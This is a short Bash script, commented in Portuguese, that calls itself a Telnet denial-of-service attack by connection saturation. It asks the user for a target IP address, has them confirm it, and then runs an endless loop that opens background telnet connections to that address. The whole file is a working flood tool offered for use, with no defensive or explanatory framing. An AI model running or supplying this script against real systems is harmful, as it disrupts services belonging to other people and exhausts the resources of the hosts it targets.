#!/bin/bash
#
# ATAQUE DE NEGACAO DE SERVICO TELNET POR
# SATURACAO DE CONEXOES TELNET
#
f_loop () {
	telnet $IP &
} 

#
COUNT=0
while [ $COUNT -eq 0 ]; do
	echo -e -n "QUAL O IP QUE QUER SE CONECTAR?: "; read IP
	echo -e -n "AS INFORMACOES ESTAO CORRETAS? [s/n]: "; read CORRETO
	case $CORRETO in
		s|S)
			echo -e "VOCE DIGITOU= [ IP: $IP ] "; sleep 3
			break
			;;
		n|N)
			echo -e "TENTE NOVAMENTE ..."; sleep 3
			;;
		*)
			echo -e "INFORMACAO INCORRENTA... TENTA NOVAMENTE..."; sleep 3
			;;
	esac
done

while true; do
	f_loop
done

exit 0
